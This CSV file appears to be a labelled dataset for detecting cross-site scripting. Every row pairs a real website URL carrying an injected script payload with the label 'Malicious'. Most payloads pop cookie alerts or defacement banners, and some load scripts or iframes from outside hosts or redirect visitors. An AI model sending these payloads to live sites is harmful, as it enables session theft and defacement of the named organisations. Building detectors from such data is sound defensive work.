Payloads,Class
http://www.blinklist.com/index.php?action=blink/addblink.php&amp;description=&amp;url=http://hackawii.com/co<br>ntrolling-doepfer-modular-synth-with-a-wiimote/&amp;title=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious
http://netlancer.ru/search/search.php?text=aa%22%3e%3cscript%3ealert(/xss/)%3c/script%3eaa%22%3e%3cs<br>cript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.tm.net.my/tmnet2006/contents/products-services/products.cfm?prodid=50&amp;type=&gt;&quot;&gt;&lt;script%20%<br>0a%0d&gt;alert('=xssbydt=')%3b&lt;/script&gt;,Malicious
https://www.newsvine.com/_nv/accounts/accountsettingslogin?tab=newsvine&amp;item=emailalerts&amp;affiliate=%<br>22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;redirect=https%3a%2f%2fwww.newsvine.com%2<br>f_nv%2faccounts%2fnewsvine%2femailalerts%3faffiliate%3d%2522%253e%253cscript%253ealert%2528document.<br>cookie%2529%253c%252fscript%253e,Malicious
http://www.thinkstockfootage.com/product/search?keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fk<br>usomiso.com%2fx.js%3e%3c%2fscript%3e&amp;go.x=0&amp;go.y=0,Malicious
http://s-e-arch.com/search.php?keyword=%3c/title%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.partygaming.com/prty/en/search/?search_query=&quot;&gt;&lt;script&gt;alert(&quot;edgard chammas was<br>here!&quot;)&lt;/script&gt;,Malicious
https://www.ovh.com/cgi-bin/neworder/order.cgi?sessionid=979e0b9badbf58fabe2c037f40a74784&amp;preorderid<br>=1&amp;domain_domainchooser_domain=xylitol-la-tapz.eu%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;tld=on,Malicious
http://www.uwg-bockhorn.de/start/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.dxhbq.gov.cn/search/searchcontroller?searchword=%b1%a9%d3%ea&amp;website=47%22%3e%3cscript%3e<br>alert(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marq<br>uee%3e,Malicious
http://www.tuzonalatina.com/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.cri.it/cgi-bin/search.cgi?terms=%3cscript%3ealert%28%27this+is+xss%27%29%3c%2fscript%3e,Malicious
http://www.sxc.hu/browse.phtml?f=users&amp;usr=%22%3e'%3e%3cscript%3ealert(123)%3c/script%3e%22',Malicious
"http://www.extenzeforlife.com/?microppcsite=google&amp;microppcterm=%22%3e%3cmarquee%3e%3ch1%3etoo_short<br>,_morningwood?%3c%2fh1%3e%3c%2fmarquee%3e&amp;gclid=cj3t2nxh8jycfqqcagod7xybra",Malicious
http://www.carstens-gemael.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://nueva-esparta.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%<br>3c/script%3e,Malicious
http://bangalore.locanto.in/q/?query=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&group&dist=1,Malicious
http://www.wen-tech.com/newsdisplay.asp?id=12&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cma<br>rquee%3e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://azureus.sourceforge.net/plugin_details.php?plugin=countrylocator%22%3e%3cscript%3ealert(/airr<br>oxssed/[-1]);%3c/script%3e,Malicious
http://maps.vodafone.com/support/index.en.php?country=%22%3cscript%3ealert%28%22xssed%22%29%3c/scrip<br>t%3e,Malicious
http://www.superspor.com/detail.php?type=search&amp;frm_kategori=haber&amp;frm_text=&quot;&gt;&lt;h1&gt;by%20st@rext&lt;/h1&gt;&lt;<br>script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert('by%20st@rext')&lt;/script&gt;%3e%3cmarquee%3ewhitehat<br>%20forever%3c/marque%3e,Malicious
https://secure.airforce.com/contact/index.php?first_nm=&quot;&gt;&lt;script&gt;alert(&quot;are global variables<br>on?&quot;);&lt;/script&gt;&amp;last_nm=&quot;&gt;&lt;script&gt;alert(&quot;oh and btw all your base are belong pappy&quot;);&lt;/script&gt;,Malicious
http://www.cbc.ca/money/stockquotechart.jsp?lang=&amp;uniqueid=&amp;ticker=%3ch1%3exss%3c%2fh1%3e%3cmarquee%<br>3e&amp;x=0&amp;y=0,Malicious
http://see.blog.sohu.com/act/2009blog/resourcepage.jsp?type=top%27%3e%3c/a%3e%3cscript%3ealert%28/se<br>curitylab/%29%3c/script%3e,Malicious
http://www.spaviv.es/usuario/ingresar.php?redireccion=%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious
http://www.feuerwehr-vs.de/hoehenrettung/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bartsandthelondon.nhs.uk/research/search/search.asp?keywords=intellectua&amp;tv=1&quot;&gt;&lt;script&gt;al<br>ert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious
http://gakusei.enjapan.com/2009/contact?ask_type_text='%3e%22%3e%3cscript/src=http://kusomiso.com/xs<br>s.js%3e%3c/script%3e,Malicious
http://www.asptutor.com/foros/post.asp?method=replyquote&amp;reply_id=7389&amp;topic_id=3958&amp;forum_id=10&amp;cat<br>_id=2&amp;forum_title=+&amp;topic_title=%3e%22%22%3e%22%3e%3cscript%3ealert%28%27norehem%27%29%3c/script%3e,Malicious
http://www.medef.fr/main/core.php?pag_id=117780&amp;words=%22%3e%3cscript%3ealert(%22defaced%20by%20spon<br>sfull%22);%3c/script%3e&amp;method=and,Malicious
"http://www.themexp.org/preview.php?mid=5248&amp;type=vs&amp;view=downloads&amp;page=9%22%3e'%3e%3cscript%3ealert<br>(string.fromcharcode(88,83,83))%3c/script%3e&amp;cat=&amp;name=xbox+xtremexp+%28update+2%29.zip&amp;proddesc=xp%<br>20visual%20styles&amp;catdesc=games&amp;namedesc=xbox%20xtremexp%20(update%202)",Malicious
https://www.americanexpress.ch/mr/de/praemienwelt/result.php?partnerrange=bmw'%3cscript%3ealert(docu<br>ment.cookie)%3c/script%3e,Malicious
http://www.thomsonscientific.com/cgi-bin/jrnlst/jlresults.cgi?pc=j&amp;alpha=x%22%3e%3cscript%3ealert(do<br>cument.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,Malicious
http://search.aimpages.com/apsearchus/gallerysearch?agelocmale=on&amp;agelocfemale=on&amp;agelocageslower=18<br>&amp;agelocagesupper=99&amp;agelocloc=%3c%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;agelockeyword=&amp;<br>withphoto=1&amp;searchtype=ageloctype&amp;sortfield=relevance&amp;state=1,Malicious
http://www.cutobook.com/arcade?search=invi&amp;cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e<br>%3chtml%3e%3ch1%3e%3cmarquee%3eby%20invi%3c/marquee%3e%3c/h1%3e%3c/html%3e,Malicious
"http://verdesmares.globo.com/v3/canais/noticias_enviar.asp?codigo=173190&amp;modulo=808&amp;titulo=http://ip<br>anorama.globo.com/plantao/caderno_especial/enviar.asp?codigo=52641&amp;titulo=&quot;&gt;&lt;script&gt;alert(string.fro<br>mcharcode(88,83,83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,1<br>03,98,117,115,116,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.menaraannonces.com/reponse_cours.php?id=%22%3e%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.8090.com.cn/search.jsp?cid='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3<br>ewhitehat%20forever%3c/marque%3e&amp;pcid='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3<br>ewhitehat%20forever%3c/marque%3e,Malicious
http://www.airlinktek.com/english/atboard.php?class1=&amp;class2=&amp;key=%22%3e%3cmarquee%3e%3ch1%3edefaced<br>%20by%20ironzorg%3c/h1%3e%3c/marquee%3e,Malicious
http://www.samuraioflegend.com/register.php?ref='%3e%3ciframe%20src=http://google.com%3e,Malicious
http://www.hackbulten.com/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3cstyle%3ebody{background-c<br>olor:black;color:white;font:50px%20arial;}%3c/style%3e%3ch1%3eby%20st@rext%3e%3cmarquee%3ewhitehat+f<br>orever+by%20st@rext%3c%2f%3cscript%3ealert(document.cookie)%3c/script%3e%3cbody%20onload=alert(/xsse<br>d/)%3e,Malicious
http://www.readyicons.com/iconset-preview.php?id=11%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3,Malicious
http://www.bnpparibas.com/en/news/press-releases.asp?code=%22%3e%3cbody+onload=alert(%22by%20encore%<br>22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e%3cscr<br>ipt%3ealert(1)%3c/script%3e,Malicious
"http://guides.lib.uchicago.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';al<br>ert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromchar<br>code(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.bharattextile.com/news/search/results.php?term=%22%3e%3ciframe+src%3djavascript%3aalert(1<br>23)%3e&amp;logic=and,Malicious
http://www.constant-content.com/area/search.htm?keywords=%3cscript%3ealert%28%22hacked%22%29%3c%2fsc<br>ript%3e%3cscript%3ealert%28%22hacked%22%29%3c%2fscript%3e%3cscript%3ealert%28%22hacked%22%29%3c%2fsc<br>ript%3e%3cscript%3ealert%28%22hacked%22%29%3c%2fscript%3e%3cscript%3ealert%28%22hacked%22%29%3c%2fsc<br>ript%3e&amp;mbasictype=71&amp;smatchis=all&amp;category=&amp;minlicnew=&amp;maxlicnew=&amp;gosearch=search,Malicious
http://www.795hosting.com/cgi-bin/adspro/ads.pl?campaign=1&amp;type=iframe&amp;color=%00'&quot;&gt;&lt;%73%63%72%69%70%<br>74&gt;%77%68%69%6c%65(%74%72%75%65){%61%6c%65%72%74(%27%6b%65%72%7a%75%61%20%77%61%73%20%68%65%72%65%27<br>)}&lt;/%73%63%72%69%70%74&gt;,Malicious
http://msn.autoweek.nl/nieuws.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marq<br>uee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;<br>/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/<br>marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.whosell.com/e-market/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.realizeband.com/dtcf/components/seminar-finder/result?frommini=true&amp;zip=&quot;&gt;&lt;script&gt;alert(d<br>ocument.cookie);&lt;/script&gt;&amp;submit.x=0&amp;submit.y=0,Malicious
"http://www.legis.state.ga.us/legis/2009_10/billsearch.php?hbmax=1721&amp;hrmax=1721&amp;sbmax=1721&amp;srmax=172<br>1&amp;billtype=hb&amp;billnumber=%27;alert(string.fromcharcode(88,83,83))//%5c%27;alert(string.fromcharcode(<br>88,83,83))//%22;alert(string.fromcharcode(88,83,83))//%5c%22;alert(string.fromcharcode(88,83,83))//-<br>-%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://aragua.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scri<br>pt%3e,Malicious
http://www.fixmycar.co.za/dealerpage.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3<br>e,Malicious
http://www.nhtsa.gov/exit.cfm?link=%3cscript%3ealert%28%22geewiz%22%29%3c%2fscript%3e,Malicious
http://questionbox.jp.msn.com/search.php3?search_type=keyword&word=%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&x=27&y=9,Malicious
http://www.failbook.fr/index.php?r=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3<br>ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenom-arabe-email.asp?prenom=%22%3e%3cscri<br>pt%3ealert('by encore')%3c/script%3e,Malicious
http://www.100pour100parfum.com/register.php?marraine=%22%3e%3ciframe+src=http://google.com%3e,Malicious
http://www.itc.virginia.edu/desktop/web/webtests/phpinfo.php3?cx[][][][][][][][][][][][][][][][][][]<br>[][][][][][][][][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.foxvideo.it/search/?search=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fsc<br>ript%3e,Malicious
http://www.tiscali.co.uk/search/results.php?section=&amp;from=hp-firsttime-headersearch&amp;query=%22%3e%27%<br>3e%3cscript%3ealert%2812345%29%3c%2fscript%3e%22%27,Malicious
http://www.nod32.com.hk/support/faq.php?lang=tc&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://pds-imaging.jpl.nasa.gov/cgi-bin/atlas/search.pl?min_center_longitude=%22%3e%3cimg+onerror=al<br>ert(string.fromcharcode(120,115,115))+src=.%",Malicious
http://www.hochzuchtguppies.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://support.easycorp.co.uk/index.php?action=announcements&amp;query=&quot;&gt;&lt;script&gt;alert(12157312.477)&lt;/s<br>cript&gt;,Malicious
http://www.natuurkunde.nl/zoeken/dosearch.do;jsessionid=f2e94490dc841016e3bec1e986433542?querystring<br>=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e,Malicious
http://playback.rhapsody.com/auth/signin?pcode=%22%3e%3ccenter%3e%3ciframe%20src=%22http://xssed.com<br>%22%3e%3c/center%3e,Malicious
http://hukutomo.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://dnscheck.se/delegation.pl?domain=%3cbig%3e%3ch1%3ejust%20cross%20the%20line...xss%3c/h1%3e%3c<br>/big%3e,Malicious
http://csc-webserver.caci.com/nsa/new/email_friend.asp?refer_url=%22%3e%3cscript%3ealert(1);%3c/scri<br>pt%3e,Malicious
http://www.evrensel.net/spor.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://dusheti.org.ge/?l=g&amp;src=1%3cscript%20%3eprompt%28971806%29%3c%2fscript%3e,Malicious
http://www.lds.org/portal/site/ldsorg/menuitem.062a5ea6a5e8d8661b622015f1e543a0/?vgnextoid=84010fd41<br>d93b010vgnvcm1000004d82620arcrd&amp;locale=0&amp;hidenav=1&amp;pagenumber=1&amp;maxresults=20&amp;narrow_by=&amp;query=%22%3<br>e%3cscript%3ealert%281%29%3c%2fscript%3e++&amp;bucket=allchurchcontent&amp;datefrom=&amp;dateto=&amp;author_category<br>=&amp;author_name=&amp;format=&amp;submitsearch=search&amp;datefromdisplay=&amp;datetodisplay=&amp;findbyauthor=,Malicious
http://www.chip.de/ii/grossbild_v2.html?grossbild=%22%3e%3c/script%3e%3cscript%3ealert(%22skyr3x%22)<br>%3c/script%3e&amp;grossbild_bu=&lt;b&gt;xssed%20%dfy%20skyr3x&lt;/b&gt;&amp;ivwkat=%28%5d317sonstig%2f%28%5d106allg%2f&amp;c<br>xo_alphabet_pfad=%2f%28%7dnews%2fprodukte+%26+technik&amp;sales=news&amp;r2_ir_container_id=33662052&amp;r2_ir_b<br>eitrag_id=5796820&amp;r2_ir_layout_id=3071&amp;r2_titel=news%2520-%2520toshiba%253a%2520gamer-notebook%2520m<br>it%2520drei%2520grafikchips&amp;r2_ir_container_url=http%3a%2f%2fwww.chip.de%2fnews%2ftoshiba-gamer-note<br>book-mit-drei-grafikchips_33662052.html,Malicious
http://milwaukee.brewers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.lekeberg.se/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;se<br>nd=s%f6k,Malicious
http://ictamworth.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br>/)%3c/script%3e%3cp,Malicious
http://www.dsa.org/search/siterslt.cfm?criteria=%22%3e%3cscript%3ealert(%22fucked%22)%3c%2fscript%3e<br>&amp;go.x=0&amp;go.y=0&amp;go=go,Malicious
http://chaines2-c.free.fr/shopping-searchs.php?cat=27&amp;page=0&amp;nb_aff_limit_promo=10&amp;query=\%27\%22%3e<br>%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/<br>marquee%3e&amp;tri=,Malicious
http://www.bromley.ac.uk/course-search.asp?searchstring=%22%3cscript+src%3dhttp://vuln.xssed.net/thi<br>rdparty/scripts/hotpockets.js%3e,Malicious
http://www.livejasmin.com/login.php?performerid=&quot;&gt;&lt;script&gt;alert(/nemessis%20www.rstzone.org/)&lt;/scrip<br>t&gt;,Malicious
http://www.realizeband.com/dtcf/components/search/result?freshsearch=true&amp;q=&quot;&gt;&lt;script&gt;alert(document<br>.cookie);&lt;/script&gt;&amp;x=0&amp;y=0,Malicious
http://url.web-tool-japan.com/%22%3e'%3e%3cscript%3ealert(%22kusomiso.com%22)%3c/script%3e/,Malicious
http://z-look.webmastak.info/search.php?q=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e&amp;aff=25236&amp;<br>saff=3,Malicious
http://www.art.illinois.edu/student.php?order=discipline&amp;imageid=1%3cscript%20%0a%0d%3ealert%28docum<br>ent.cookie%29;%3c/script%3e,Malicious
http://www.gapep.gov.tr/search.php?searchkeys=%3cscript%3ealert%283414208%29%3c%2fscript%3e&amp;lang=tr&amp;<br>arastir=arast%c4%b1r,Malicious
http://www.europeana.eu/portal/search.html?query=%3c%2ftitle%3e+%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious
http://www.insmed.com/secondary.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.adventureonline.co.za/read_more.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/sc<br>ript%3e,Malicious
http://www.ukraine-visa.com/cgi-bin/affiliates/stats.cgi?user=&amp;pass=&amp;email=%27%22%3e%3c%2ftitle%3e%3<br>cscript%3ealert(1337)%3c%2fscript%3e%3ciframe+src%3d%22http%3a%2f%2fxylilabs.free.fr%2fhome%2fxssed%<br>2findex.html%22%3e%3c%2fiframe%3e&amp;action=get+lost+password,Malicious
http://www.hakkari.gov.tr/haberler.asp?id=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(document.cookie)%3b&lt;/script&gt;&amp;shf<br>=1,Malicious
http://www.tourisme.gov.ma/rural/fr/regions/points_forts.asp?activite=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://biblioteca.carregal-digital.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newse<br>arch=1&amp;searchtxt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://banque.hsbc.fr/contact/contact_ent_inter.php?dest=%22%3e%3cscript%3ealert(/www.trlink.net%20h<br>sbc%20france%20easy%20security/)%3c/script%3e,Malicious
http://www.hotelash.co.nz/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://recrutweb.unesco.org/postes/postes_visualisation.asp?afflangue=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://hatomune.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
"http://www.dysontt.com/main.php?id=9""><script>alert(document.cookie)</script>",Malicious
http://www.marmaracicek.com/default.asp?sayfa=urun1&amp;kategori=buketler&amp;baslik=buketler&lt;script&gt;alert(&quot;<br>cyber_thief(turkey)%20hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.lorraine.ecologie.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello<br>%20the%20rat')%3c/script%3e,Malicious
http://www.unigis.uni-osnabrueck.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.mysql.ru/webboard/search.html?text=""><script>alert(string.fromcharcode(88,83,83))</script>",Malicious
http://www.dunav.com/pretraga/pretraga.php?trazi=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&sta=1,Malicious
http://www.rom-world.com/search/?q=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;submit.x=12&amp;su<br>bmit.y=11,Malicious
http://www.wostep.ch/index.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://ms143.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://search.usda.gov/search?q=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;btng.x=12&amp;b<br>tng.y=16&amp;btng=go%21&amp;btng=go%21&amp;filter=0&amp;as_sitesearch=ars.usda.gov&amp;ie=&amp;output=xml_no_dtd&amp;client=usda<br>&amp;lr=&amp;proxystylesheet=ars&amp;oe=,Malicious
http://ms107.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://osvdb.org/searchdb.php?ext_ref_type=related+osvdb+id&amp;vuln_title=xss&amp;&amp;&quot;&gt;&lt;script&gt;alert('s0m.ph'<br>);&lt;/script&gt;,Malicious
http://web.njcu.edu/its/photogallery/main/profstudies/fitness/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.keepmyclearance.com/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.midyat.net/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://bozemancvb.visitmt.com/categories/primaryresults.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>&quot;)&lt;/script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.caboverdeonline.com/marketplace/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(c<br>yber-unity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.dominiquealboublanc.com/page.php?src=infoslegales.html&amp;lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://cz.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://www.in.com/messagecentral/search_messages.php?search_query=%3cscript%3ealert%28/xss%20by%2003storic/%29%3c/script%3e,Malicious
http://busca.uol.com.br/uol/index.html?id=16&amp;ref=musica&amp;busca=%3cscript%3ealert%28%22xroot+owned+you<br>%21%22%29%3c%2fscript%3e&amp;param1=homebusca&amp;q=%3cscript%3ealert%28%22xroot+owned+you%21%22%29%3c%2fscr<br>ipt%3e,Malicious
